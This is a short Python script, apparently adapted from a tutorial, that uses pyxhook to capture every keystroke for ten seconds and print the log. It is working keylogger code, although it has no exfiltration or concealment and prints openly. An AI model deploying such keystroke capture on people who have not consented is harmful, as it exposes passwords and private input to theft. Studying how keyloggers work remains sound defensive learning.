import pyxhook
import threading
import time

# Global variable to store the captured keys
captured_keys = []
# foasjdfa;sjfla;sjflaj kajsdf;lkjefj
# Event to stop key capturing
stop_event = threading.Event()

# Function to capture keys for a specified duration and return the log as a string


def capture_keys_for_duration(duration):
    global captured_keys
    global stop_event

    # create a hook manager object
    hook_manager = pyxhook.HookManager()

    # Function to handle key press events
    def on_key_press(event):
        if event.Ascii == 96:  # Change the cancel key as needed
            stop_event.set()
        else:
            captured_keys.append(event.Key)

    # Set the key press event handler
    hook_manager.KeyDown = on_key_press

    # Set the hook
    hook_manager.HookKeyboard()

    try:
        # Start the hook manager in a new thread
        hook_thread = threading.Thread(target=hook_manager.start)
        hook_thread.start()

        # Wait for the specified duration or until the stop event is set
        stop_event.wait(duration)
    except KeyboardInterrupt:
        # User cancelled from command line.
        pass
    except Exception as ex:
        # Write exceptions to the log file, for analysis later.
        msg = 'Error while catching events:\n {}'.format(ex)
        pyxhook.print_err(msg)

    # Stop the hook manager and join the thread
    hook_manager.cancel()
    hook_thread.join()

    # Return the captured keys as a string
    return ''.join(captured_keys)


# Example usage: Capture keys for 10 seconds and print the log
duration = 10  # Set the duration in seconds
log = capture_keys_for_duration(duration)
print('Captured Keys:')
print(log)

# credit : - https://www.geeksforgeeks.org/design-a-keylogger-in-python/
